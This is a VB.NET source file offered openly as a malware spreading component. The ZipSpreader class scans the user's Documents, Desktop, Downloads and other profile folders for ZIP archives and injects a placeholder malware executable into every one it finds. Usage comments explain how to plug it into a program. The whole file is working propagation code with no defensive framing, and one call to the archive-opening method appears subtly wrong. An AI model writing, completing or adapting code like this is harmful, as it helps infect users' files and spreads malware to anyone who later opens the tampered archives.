Imports System.IO
Imports System.IO.Compression

Public Class ZipSpreader

    'How to invoke (from main form):
    '
    '     Private zs As New ZipSpreader()
    '
    '     zs.Spread()


    'Requirements:
    '
    ' Go to:
    '
    '     Assemblies > Framework > Add > System.IO.Compression


    Private targets As New List(Of String)()

    'your payload here
    Private payload As String = "C:\your_path\your_malware.exe"

    Public Sub Spread()
        ' List of common directories to target for ZIP files
        Dim targetDirs As New List(Of String) From {
            "Documents", "Desktop", "Videos", "Music", "Favorites", "Downloads", "Pictures"
        }

        ' Index files in target directories
        For Each dir As String In targetDirs
            Index(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), dir))
        Next

        ' Inject payload into each found ZIP file
        For Each zipFile As String In targets
            ZipInject(zipFile)
        Next
    End Sub

    ' Recursive function to find ZIP files in a given directory and its subdirectories
    Private Sub Index(directoryPath As String)
        Try
            ' Get all files in the current directory
            Dim files As String() = Directory.GetFiles(directoryPath)

            ' Add any ZIP files to the targets list
            For Each file As String In files
                If file.ToLower().EndsWith(".zip") Then
                    targets.Add(file)
                End If
            Next

            ' Get all subdirectories in the current directory
            Dim subDirs As String() = Directory.GetDirectories(directoryPath)

            ' Recursively index subdirectories
            For Each subDir As String In subDirs
                ' Avoid problematic system directories
                Dim dirName As String = Path.GetFileName(subDir)
                If dirName <> "My Music" AndAlso dirName <> "My Pictures" AndAlso dirName <> "My Videos" Then
                    Index(subDir)
                End If
            Next
        Catch ex As UnauthorizedAccessException
            ' Log if access is denied (directories with restricted access)
            Console.WriteLine($"Access denied to {directoryPath}.")
        Catch ex As Exception
            ' Log other unexpected exceptions
            Console.WriteLine($"Error processing {directoryPath}: {ex.Message}")
        End Try
    End Sub

    ' Function to inject the payload into a ZIP file
    Private Sub ZipInject(zipFile As String)
        Try
            ' Open the ZIP file in update mode
            Using archive As ZipArchive = zipFile.Open(zipFile, ZipArchiveMode.Update)
                ' Add the payload file to the ZIP archive
                archive.CreateEntryFromFile(payload, Path.GetFileName(payload))
            End Using
        Catch ex As Exception
            ' Log errors related to ZIP file manipulation
            Console.WriteLine($"Error injecting payload into {zipFile}: {ex.Message}")
        End Try
    End Sub
End Class
